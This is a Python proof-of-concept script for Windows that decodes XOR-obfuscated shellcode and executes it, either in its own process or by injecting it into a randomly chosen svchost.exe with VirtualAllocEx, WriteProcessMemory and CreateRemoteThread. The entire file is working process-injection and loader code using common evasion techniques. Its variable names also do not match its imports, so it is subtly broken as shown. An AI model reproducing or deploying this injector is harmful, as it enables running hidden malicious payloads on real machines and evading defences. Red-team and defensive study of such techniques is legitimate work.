#!/usr/bin/env python3

import ctypes
import ctypes.wintypes as wt
import psutil
import random
import os
import platform
import sys
from notepad_x64_encrypted import notepad_x64_encrypted
from notepad_x86_encrypted import notepad_x86_encrypted


class ShellcodeExecute():

    PROCESS_SOME_ACCESS = 0x000028
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    MEM_COMMIT_RESERVE = 0x3000

    PAGE_READWRITE = 0x04
    PAGE_READWRITE_EXECUTE = 0x40
    PAGE_READ_EXECUTE = 0x20

    def __init__(self, shellcode=None):
        self.kernel32 = ctypes.windll.kernel32
        self.kernel32_function_definitions()
        domain = os.getenv('USERDOMAIN')
        name = os.getenv('USERNAME')
        self.username = '{}\\{}'.format(domain, name).lower()
        if shellcode is None and platform.architecture()[0] == '64bit':
            self.shellcode = self.xorme(notepad_x64, 87)
        else:
            self.shellcode = self.xorme(notepad_x86, 87)

        menu = """
____________________________________________________________

   Python Proof of Concept Shellcode Execution Techniques
   Author: Joff Thyer, (c) 2020 River Gum Security LLC
 ____________________________________________________________

    1. VirtualAlloc()/CreateThread() in same process
    2. Inject into remote process with CreateRemoteThread()

    9. Exit Program

"""
        done = False
        while not done:
            print(menu)
            try:
                s = int(input("  Enter your selection: "))
            except:
                continue
            if s == 1:
                self.SCE_SameProcess()
            elif s == 2:
                self.SCE_InjectProcess()
            elif s == 9:
                done = True

    def kernel32_function_definitions(self):
        # CloseHandle()
        self.CloseHandle = ctypes.windll.kernel32.CloseHandle
        self.CloseHandle.argtypes = [wt.HANDLE]
        self.CloseHandle.restype = wt.BOOL

        # CreateThread()
        self.CreateThread = ctypes.windll.kernel32.CreateThread
        self.CreateThread.argtypes = [
            wt.LPVOID, ctypes.c_size_t, wt.LPVOID,
            wt.LPVOID, wt.DWORD, wt.LPVOID
        ]
        self.CreateThread.restype = wt.HANDLE

        # CreateRemoteThread()
        self.CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
        self.CreateRemoteThread.argtypes = [
            wt.HANDLE, wt.LPVOID, ctypes.c_size_t,
            wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID
        ]
        self.CreateRemoteThread.restype = wt.HANDLE

        # HeapAlloc()
        self.HeapAlloc = ctypes.windll.kernel32.HeapAlloc
        self.HeapAlloc.argtypes = [wt.HANDLE, wt.DWORD, ctypes.c_size_t]
        self.HeapAlloc.restype = wt.LPVOID

        # HeapCreate()
        self.HeapCreate = ctypes.windll.kernel32.HeapCreate
        self.HeapCreate.argtypes = [wt.DWORD, ctypes.c_size_t, ctypes.c_size_t]
        self.HeapCreate.restype = wt.HANDLE

        # OpenProcess()
        self.OpenProcess = ctypes.windll.kernel32.OpenProcess
        self.OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
        self.OpenProcess.restype = wt.HANDLE

        # RtlMoveMemory()
        self.RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory
        self.RtlMoveMemory.argtypes = [wt.LPVOID, wt.LPVOID, ctypes.c_size_t]
        self.RtlMoveMemory.restype = wt.LPVOID

        # VirtualAlloc()
        self.VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
        self.VirtualAlloc.argtypes = [
            wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD
        ]
        self.VirtualAlloc.restype = wt.LPVOID

        # VirtualAllocEx()
        self.VirtualAllocEx = ctypes.windll.kernel32.VirtualAllocEx
        self.VirtualAllocEx.argtypes = [
            wt.HANDLE, wt.LPVOID, ctypes.c_size_t,
            wt.DWORD, wt.DWORD
        ]
        self.VirtualAllocEx.restype = wt.LPVOID

        # VirtualFreeEx()
        self.VirtualFreeEx = ctypes.windll.kernel32.VirtualFreeEx
        self.VirtualFreeEx.argtypes = [
            wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.DWORD
        ]
        self.VirtualFreeEx.restype = wt.BOOL

        # VirtualProtect()
        self.VirtualProtect = ctypes.windll.kernel32.VirtualProtect
        self.VirtualProtect.argtypes = [
            wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.LPVOID
        ]
        self.VirtualProtect.restype = wt.BOOL

        # VirtualProtectEx()
        self.VirtualProtectEx = ctypes.windll.kernel32.VirtualProtectEx
        self.VirtualProtectEx.argtypes = [
            wt.HANDLE, wt.LPVOID, ctypes.c_size_t,
            wt.DWORD, wt.LPVOID
        ]
        self.VirtualProtectEx.restype = wt.BOOL

        # WaitForSingleObject
        self.WaitForSingleObject = self.kernel32.WaitForSingleObject
        self.WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]
        self.WaitForSingleObject.restype = wt.DWORD

        # WriteProcessMemory()
        self.WriteProcessMemory = self.kernel32.WriteProcessMemory
        self.WriteProcessMemory.argtypes = [
            wt.HANDLE, wt.LPVOID, wt.LPCVOID,
            ctypes.c_size_t, wt.LPVOID
        ]
        self.WriteProcessMemory.restype = wt.BOOL

    def select_pid(self):
        candidates = {}
        for pid in psutil.pids():
            p = psutil.Process(pid)
            try:
                name = p.name()
                username = p.username().lower()
            except:
                continue
            if self.username == username and name == 'svchost.exe':
                candidates[pid] = name
        choice = random.choice(list(candidates.keys()))
        print('[*] Selected Process ID: {} ({}) to Inject'.format(
            choice, candidates[choice]
        ))
        return int(choice)

    def xorme(self, buf, k):
        res = b''
        for ch in buf:
            res += chr(ch ^ k).encode('latin1')
        return res

    def SCE_SameProcess(self):
        print("""
[*] =============================================
[*]  Shellcode Resident in Same Process using
[*]  VirtualAlloc()/CreateThread()!
[*] =============================================""")
        memptr = self.VirtualAlloc(
            0, len(self.shellcode),
            self.MEM_COMMIT_RESERVE,
            self.PAGE_READWRITE
        )
        print('[*] VirtuallAlloc() Memory at: {:08X}'.format(memptr))
        self.RtlMoveMemory(memptr, self.shellcode, len(self.shellcode))
        print('[*] Shellcode copied into memory.')
        oldp = ctypes.pointer(wt.DWORD())
        self.VirtualProtect(memptr, len(self.shellcode), self.PAGE_READ_EXECUTE, oldp)
        print('[*] Changed permissions on memory to READ_EXECUTE only.')
        thread = self.CreateThread(0, 0, memptr, 0, 0, 0)
        print('[*] CreateThread() in same process.')
        self.WaitForSingleObject(thread, 0xFFFFFFFF)

    def SCE_InjectProcess(self):
        print("""
[*] =======================================================
[*] Find a process to inject shellcode into using process
[*] listing, then VirtualAllocEx(), WriteProcessMemory(),
[*] CreateRemoteThread()
[*] =======================================================""")
        pid = self.select_pid()
        ph = self.kernel32.OpenProcess(self.PROCESS_SOME_ACCESS, False, pid)
        print('[*] Process handle is: 0x{:06X}'.format(ph))
        if ph == 0:
            return

        memptr = self.VirtualAllocEx(
            ph, 0, len(self.shellcode),
            self.MEM_COMMIT_RESERVE,
            self.PAGE_READWRITE
        )
        print('[*] VirtualAllocEx() memory at: 0x{:08X}'.format(memptr))
        if memptr == 0:
            return

        nbytes = ctypes.c_int(0)
        result = self.WriteProcessMemory(
            ph, memptr, self.shellcode,
            len(self.shellcode), ctypes.byref(nbytes)
        )
        print('[+] Bytes written = {}'.format(nbytes.value))
        if result == 0:
            print("[-] WriteProcessMemory() Failed - Error Code: {}".format(
                self.kernel32.GetLastError()
            ))
            return

        oldp = ctypes.pointer(wt.DWORD())
        result = self.VirtualProtectEx(
            ph, memptr, len(self.shellcode),
            self.PAGE_READ_EXECUTE, oldp
        )
        if result == 0:
            print("[-] VirtualProtectEx() Failed - Error Code: {}".format(
                self.kernel32.GetLastError()
            ))
            return
        th = self.CreateRemoteThread(ph, None, 0, memptr, None, 0, None)
        if th == 0:
            print("[-] CreateRemoteThread() Failed - Error Code: {}".format(
                self.kernel32.GetLastError()
            ))
            return
        self.VirtualFreeEx(ph, memptr, 0, 0xC000)
        self.CloseHandle(ph)


if __name__ == '__main__':
    ShellcodeExecute()
